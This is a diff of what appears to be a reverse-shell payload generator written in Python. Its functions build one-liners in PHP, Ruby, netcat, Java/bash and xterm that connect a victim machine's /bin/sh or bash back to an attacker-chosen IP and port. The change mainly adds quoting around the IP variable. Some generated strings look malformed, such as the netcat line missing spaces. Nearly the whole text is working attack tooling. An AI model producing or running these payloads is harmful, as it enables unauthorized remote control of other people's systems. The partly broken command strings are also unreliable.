@@ -70,23 +70,24 @@ def python():
 
 
 def php():
-                
-                script = "php -r '$sock=fsockopen("+ip+","+port+");exec("+"/bin/sh -i <&3 >&3 2>&3"+");'"
+                ipAddress='"'+ip+'"'
+                script = "php -r '$sock=fsockopen("+ipAddress+","+port+");"+'exec("/bin/sh -i <&3 >&3 2>&3");\''
                 shGen(script)
                 print(script)
 
 def ruby():                
+                ipAddress='"'+ip+'"'
                 script = "ruby -rsocket -e'f=TCPSocket.open("+ip+","+port+").to_i;exec sprintf("+"/bin/sh -i+"+"<&%d >&%d 2>&%d,f,f,f"+")'"
                 shGen(script)
                 print(script)
 
 def netcat():
-           
+                ipAddress='"'+ip+'"'
                 script = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc" +ip+ ""+port+">/tmp/f"
                 shGen(script)
 
 def java():
-           
+                ipAddress='"'+ip+'"'  
                 script1 = "r = Runtime.getRuntime()"
                 script2 = "p = r.exec(["+"/bin/bash","-c","exec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do \$line 2>&5 >&5;"
                 script3 = '"done"] as String[])"'
@@ -98,7 +99,7 @@ def java():
                 script=str(script1)+'\n'+str(script2)+'\n'+str(script3)+'\n'+str(script4)+'\n'
                 shGen(script)
 def xterm():
-           
+                ipAddress='"'+ip+'"'
                 script = "xterm -display"+ip+":"+port+""
                 shGen(script)
                 print(script)
